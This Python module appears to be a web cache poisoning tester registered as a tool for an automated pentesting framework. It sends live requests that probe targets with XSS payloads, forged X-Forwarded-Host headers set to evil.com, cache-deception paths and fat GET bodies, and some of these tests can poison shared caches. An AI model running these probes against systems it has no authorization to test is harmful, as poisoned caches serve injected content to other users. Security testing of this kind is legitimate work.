"""
Cache Poisoning Tester - Automated web cache poisoning vulnerability detection.

Complements the cache_poisoning.jinja prompt module with automated testing capabilities.
"""

import time
import urllib.parse
from typing import Any, Literal

import httpx

from strix.tools.registry import register_tool
from strix.tools.validation import (
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

CachePoisoningAction = Literal[
    "detect",
    "test_headers",
    "test_deception",
    "test_fat_get",
    "analyze",
    "generate_payloads",
]

VALID_ACTIONS = [
    "detect",
    "test_headers",
    "test_deception",
    "test_fat_get",
    "analyze",
    "generate_payloads",
]

CACHE_HEADERS = [
    "X-Cache",
    "X-Cache-Hits",
    "CF-Cache-Status",
    "X-Served-By",
    "Age",
    "Via",
    "X-Varnish",
    "Cache-Control",
    "ETag",
    "Vary",
    "X-Akamai-Transformed",
    "X-True-Cache-Key",
    "Surrogate-Control",
]

UNKEYED_HEADERS = [
    ("X-Forwarded-Host", "evil.com"),
    ("X-Forwarded-Scheme", "https"),
    ("X-Forwarded-Proto", "http"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Host", "evil.com"),
    ("X-Forwarded-Server", "evil.com"),
    ("X-HTTP-Host-Override", "evil.com"),
    ("Forwarded", "host=evil.com"),
    ("X-Forwarded-Port", "443"),
    ("X-Forwarded-Prefix", "/prefix"),
    ("True-Client-IP", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
]

XSS_PAYLOADS = [
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "<img src=x onerror=alert(1)>",
]


@register_tool
def cache_poisoning_tester(
    action: CachePoisoningAction,
    url: str,
    header_name: str | None = None,
    header_value: str | None = None,
    cache_buster: str | None = None,
    deception_path: str | None = None,
    body_content: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """
    Test for web cache poisoning vulnerabilities.

    Detects cache behavior, tests unkeyed inputs, and identifies
    poisoning opportunities in CDN and proxy caches.

    Args:
        action: The testing action to perform
        url: Target URL to test
        header_name: Specific header to test (for test_headers)
        header_value: Value to inject in header
        cache_buster: Query parameter for cache busting
        deception_path: Path extension for cache deception (e.g., ".css")
        body_content: Body content for fat GET testing
        timeout: Request timeout in seconds

    Returns:
        Dictionary containing test results
    """
    unknown = validate_unknown_params(
        kwargs,
        ["action", "url", "header_name", "header_value", "cache_buster",
         "deception_path", "body_content", "timeout"],
    )
    if unknown:
        return {"error": f"Unknown parameters: {unknown}"}

    action_error = validate_action_param(action, VALID_ACTIONS)
    if action_error:
        return action_error

    url_error = validate_required_param(url, "url")
    if url_error:
        return url_error

    try:
        if action == "detect":
            return _detect_cache(url, timeout)
        elif action == "test_headers":
            return _test_unkeyed_headers(url, header_name, header_value, cache_buster, timeout)
        elif action == "test_deception":
            return _test_cache_deception(url, deception_path, timeout)
        elif action == "test_fat_get":
            return _test_fat_get(url, body_content, cache_buster, timeout)
        elif action == "analyze":
            return _analyze_cache_behavior(url, timeout)
        elif action == "generate_payloads":
            return _generate_payloads(url, header_name)
        else:
            return {"error": f"Unknown action: {action}"}
    except httpx.RequestError as e:
        return {"error": f"Request failed: {e!s}"}
    except Exception as e:
        return {"error": f"Test failed: {e!s}"}


def _detect_cache(url: str, timeout: int) -> dict[str, Any]:
    """Detect caching behavior through headers and timing."""
    results = {
        "url": url,
        "cache_detected": False,
        "cache_type": None,
        "cache_headers": {},
        "timing": {},
        "vary_headers": [],
    }

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # First request (likely cache miss)
        start = time.time()
        resp1 = client.get(url)
        time1 = time.time() - start

        # Second request (likely cache hit)
        start = time.time()
        resp2 = client.get(url)
        time2 = time.time() - start

        results["timing"] = {
            "first_request_ms": round(time1 * 1000, 2),
            "second_request_ms": round(time2 * 1000, 2),
            "speedup_ratio": round(time1 / time2, 2) if time2 > 0 else 0,
        }

        # Check for cache headers
        for header in CACHE_HEADERS:
            if header.lower() in resp2.headers:
                results["cache_headers"][header] = resp2.headers[header.lower()]

        # Detect cache type
        if "cf-cache-status" in resp2.headers:
            results["cache_type"] = "Cloudflare"
            status = resp2.headers["cf-cache-status"]
            results["cache_detected"] = status in ["HIT", "STALE", "REVALIDATED"]
        elif "x-varnish" in resp2.headers:
            results["cache_type"] = "Varnish"
            results["cache_detected"] = True
        elif "x-served-by" in resp2.headers and "cache" in resp2.headers.get("x-served-by", "").lower():
            results["cache_type"] = "Fastly"
            results["cache_detected"] = True
        elif "x-akamai-transformed" in resp2.headers:
            results["cache_type"] = "Akamai"
            results["cache_detected"] = True
        elif "x-cache" in resp2.headers:
            cache_val = resp2.headers["x-cache"].upper()
            results["cache_detected"] = "HIT" in cache_val
            results["cache_type"] = "Generic CDN/Proxy"
        elif "age" in resp2.headers:
            results["cache_detected"] = True
            results["cache_type"] = "Unknown (Age header present)"

        # Check timing-based detection
        if results["timing"]["speedup_ratio"] > 2:
            results["timing_indicates_cache"] = True
        else:
            results["timing_indicates_cache"] = False

        # Get Vary header
        if "vary" in resp2.headers:
            results["vary_headers"] = [v.strip() for v in resp2.headers["vary"].split(",")]

        # Cache-Control analysis
        if "cache-control" in resp2.headers:
            cc = resp2.headers["cache-control"].lower()
            results["cache_control"] = {
                "public": "public" in cc,
                "private": "private" in cc,
                "no_store": "no-store" in cc,
                "no_cache": "no-cache" in cc,
                "max_age": _extract_max_age(cc),
            }

    return results


def _extract_max_age(cache_control: str) -> int | None:
    """Extract max-age value from Cache-Control header."""
    import re
    match = re.search(r"max-age=(\d+)", cache_control)
    return int(match.group(1)) if match else None


def _test_unkeyed_headers(
    url: str,
    header_name: str | None,
    header_value: str | None,
    cache_buster: str | None,
    timeout: int,
) -> dict[str, Any]:
    """Test for unkeyed header inputs that can poison cache."""
    results = {
        "url": url,
        "unkeyed_headers": [],
        "reflected_headers": [],
        "potential_poisoning": [],
    }

    # Add cache buster if provided
    test_url = url
    if cache_buster:
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}cb={cache_buster}"

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # Get baseline response
        baseline = client.get(test_url)
        baseline_body = baseline.text

        # Test specific header or all common unkeyed headers
        headers_to_test = []
        if header_name and header_value:
            headers_to_test = [(header_name, header_value)]
        else:
            headers_to_test = UNKEYED_HEADERS

        for hdr_name, hdr_value in headers_to_test:
            try:
                # Test with unkeyed header
                test_headers = {hdr_name: hdr_value}
                resp = client.get(test_url, headers=test_headers)

                # Check if value is reflected
                if hdr_value in resp.text and hdr_value not in baseline_body:
                    results["reflected_headers"].append({
                        "header": hdr_name,
                        "value": hdr_value,
                        "reflected": True,
                    })

                    # Test for XSS potential
                    for payload in XSS_PAYLOADS:
                        xss_headers = {hdr_name: payload}
                        xss_resp = client.get(test_url, headers=xss_headers)
                        if payload in xss_resp.text:
                            results["potential_poisoning"].append({
                                "header": hdr_name,
                                "payload": payload,
                                "injectable": True,
                            })
                            break

                # Check if response differs (unkeyed input affects response)
                if resp.text != baseline_body:
                    results["unkeyed_headers"].append({
                        "header": hdr_name,
                        "affects_response": True,
                    })

            except Exception as e:
                results.setdefault("errors", []).append(f"{hdr_name}: {e!s}")

    results["vulnerable"] = len(results["potential_poisoning"]) > 0 or len(results["reflected_headers"]) > 0

    return results


def _test_cache_deception(url: str, deception_path: str | None, timeout: int) -> dict[str, Any]:
    """Test for web cache deception vulnerabilities."""
    results = {
        "url": url,
        "deception_paths_tested": [],
        "potentially_vulnerable": [],
    }

    # Default deception extensions
    extensions = [".css", ".js", ".png", ".jpg", ".gif", ".ico", ".svg", ".woff"]

    # Parse URL
    parsed = urllib.parse.urlparse(url)
    base_path = parsed.path.rstrip("/")

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # Get original response
        try:
            original = client.get(url)
            original_content_type = original.headers.get("content-type", "")
        except Exception as e:
            return {"error": f"Failed to fetch original URL: {e!s}"}

        # Test deception paths
        paths_to_test = []
        if deception_path:
            paths_to_test = [deception_path]
        else:
            paths_to_test = [
                f"{base_path}/nonexistent{ext}" for ext in extensions
            ] + [
                f"{base_path}{ext}" for ext in extensions
            ]

        for test_path in paths_to_test:
            test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"
            if parsed.query:
                test_url += f"?{parsed.query}"

            try:
                resp = client.get(test_url)

                test_result = {
                    "path": test_path,
                    "status": resp.status_code,
                    "content_type": resp.headers.get("content-type", ""),
                    "cached": False,
                }

                # Check cache status
                cache_status = resp.headers.get("x-cache", resp.headers.get("cf-cache-status", ""))
                if "HIT" in cache_status.upper():
                    test_result["cached"] = True

                # Check if original content served at deceptive path
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Response has content - check if it matches original
                    if original.text[:500] in resp.text or resp.text[:500] in original.text:
                        test_result["serves_original_content"] = True

                        # If cached with original content, potentially vulnerable
                        if test_result["cached"]:
                            results["potentially_vulnerable"].append(test_result)

                results["deception_paths_tested"].append(test_result)

            except Exception as e:
                results["deception_paths_tested"].append({
                    "path": test_path,
                    "error": str(e),
                })

    results["vulnerable"] = len(results["potentially_vulnerable"]) > 0

    return results


def _test_fat_get(url: str, body_content: str | None, cache_buster: str | None, timeout: int) -> dict[str, Any]:
    """Test for fat GET request cache poisoning."""
    results = {
        "url": url,
        "fat_get_accepted": False,
        "body_affects_response": False,
        "potentially_vulnerable": False,
    }

    test_url = url
    if cache_buster:
        sep = "&" if "?" in url else "?"
        test_url = f"{url}{sep}cb={cache_buster}"

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # Get baseline
        baseline = client.get(test_url)
        baseline_body = baseline.text

        # Test fat GET (GET with body)
        test_body = body_content or "param=test_value_12345"

        try:
            # httpx allows body in GET requests
            resp = client.request(
                "GET",
                test_url,
                content=test_body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )

            results["fat_get_accepted"] = resp.status_code == 200

            # Check if body affects response
            if resp.text != baseline_body:
                results["body_affects_response"] = True

            # Check if test value reflected
            if "test_value_12345" in resp.text and "test_value_12345" not in baseline_body:
                results["body_reflected"] = True

            # Verify cache poisoning
            # Make clean GET without body
            verify = client.get(test_url)

            if results.get("body_reflected") and "test_value_12345" in verify.text:
                results["cache_poisoned"] = True
                results["potentially_vulnerable"] = True

        except Exception as e:
            results["error"] = str(e)

    return results


def _analyze_cache_behavior(url: str, timeout: int) -> dict[str, Any]:
    """Comprehensive cache behavior analysis."""
    results = {
        "url": url,
        "cache_detection": {},
        "key_analysis": {},
        "recommendations": [],
    }

    with httpx.Client(timeout=timeout, follow_redirects=True) as client:
        # Basic cache detection
        results["cache_detection"] = _detect_cache(url, timeout)

        # Test query parameter handling
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Test parameter order sensitivity
        resp1 = client.get(f"{base_url}?a=1&b=2")
        resp2 = client.get(f"{base_url}?b=2&a=1")

        results["key_analysis"]["param_order_matters"] = resp1.text != resp2.text

        # Test analytics parameters (often unkeyed)
        analytics_params = ["utm_source", "utm_medium", "utm_campaign", "fbclid", "gclid"]
        for param in analytics_params:
            test_url = f"{base_url}?{param}=test_poison_12345"
            resp = client.get(test_url)

            # Check if accessible without param
            clean_resp = client.get(base_url)

            if "test_poison_12345" in clean_resp.text:
                results["key_analysis"].setdefault("unkeyed_params", []).append(param)

        # Generate recommendations
        if results["cache_detection"].get("cache_detected"):
            results["recommendations"].append("Cache detected - test for unkeyed inputs")

            if not results["cache_detection"].get("vary_headers"):
                results["recommendations"].append("No Vary header - test header-based poisoning")

            vary = results["cache_detection"].get("vary_headers", [])
            if "Cookie" not in vary:
                results["recommendations"].append("Cookie not in Vary - test cookie-based poisoning")

            cc = results["cache_detection"].get("cache_control", {})
            if cc.get("public"):
                results["recommendations"].append("Cache-Control: public - shared cache, higher impact")

    return results


def _generate_payloads(url: str, header_name: str | None) -> dict[str, Any]:
    """Generate cache poisoning test payloads."""
    parsed = urllib.parse.urlparse(url)

    payloads = {
        "header_injection": [],
        "parameter_cloaking": [],
        "cache_deception": [],
        "fat_get": [],
    }

    # Header injection payloads
    headers_to_test = [(header_name, "")] if header_name else UNKEYED_HEADERS
    for hdr, _ in headers_to_test:
        for xss in XSS_PAYLOADS:
            payloads["header_injection"].append({
                "header": hdr,
                "value": xss,
                "description": f"XSS via {hdr} header",
            })

    # Parameter cloaking payloads
    payloads["parameter_cloaking"] = [
        {
            "url": f"{url};poison=<script>alert(1)</script>",
            "description": "Semicolon parameter injection (Ruby/Rails)",
        },
        {
            "url": f"{url}%26poison%3D<script>alert(1)</script>",
            "description": "URL-encoded delimiter confusion",
        },
        {
            "url": f"{url}&__proto__[test]=poison",
            "description": "Prototype pollution via query param",
        },
    ]

    # Cache deception payloads
    base_path = parsed.path.rstrip("/")
    payloads["cache_deception"] = [
        {
            "url": f"{parsed.scheme}://{parsed.netloc}{base_path}/anything.css",
            "description": "CSS extension deception",
        },
        {
            "url": f"{parsed.scheme}://{parsed.netloc}{base_path}/anything.js",
            "description": "JS extension deception",
        },
        {
            "url": f"{parsed.scheme}://{parsed.netloc}/static/../{base_path.lstrip('/')}",
            "description": "Path traversal deception",
        },
    ]

    # Fat GET payloads
    payloads["fat_get"] = [
        {
            "method": "GET",
            "body": "callback=<script>alert(1)</script>",
            "description": "JSONP callback injection",
        },
        {
            "method": "GET",
            "body": "redirect=javascript:alert(1)",
            "description": "Redirect parameter poisoning",
        },
    ]

    return payloads
